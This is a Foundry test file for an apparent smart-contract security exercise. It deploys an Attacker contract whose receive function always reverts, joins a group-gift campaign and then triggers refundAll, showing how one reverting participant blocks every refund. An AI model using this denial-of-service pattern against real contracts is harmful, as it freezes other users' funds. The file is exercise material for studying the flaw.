// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {GroupGiftRefunds} from "../src/09_GroupGiftRefunds.sol";

contract Attacker {

    receive() external payable {
        revert();
    }
}

contract GroupGiftRefundsTest is Test {
    GroupGiftRefunds public victim;
    Attacker public attacker = new Attacker();

    address user1 = address(1);
    address user2 = address(2);
    address user3 = address(3);
    address user4 = address(4);
    address recipient = address(5);

    function setUp() public {
        victim = new GroupGiftRefunds(1 ether, recipient);

        vm.deal(user1, 1 ether);
        vm.deal(user2, 1 ether);
        vm.deal(address(attacker), 1 ether);
        vm.deal(user3, 1 ether);
        vm.deal(user4, 1 ether);
    }

    function test_GroupGiftRefunds() public {

        vm.prank(user1);
        victim.join{value: 1 ether}();

        vm.prank(user2);
        victim.join{value: 1 ether}();

        vm.prank(address(attacker));
        victim.join{value: 1 ether}();

        vm.prank(user3);
        victim.join{value: 1 ether}();

        vm.prank(user4);
        victim.join{value: 1 ether}();

        vm.prank(victim.owner());
        victim.cancelCampaign();
        victim.refundAll();
    }
}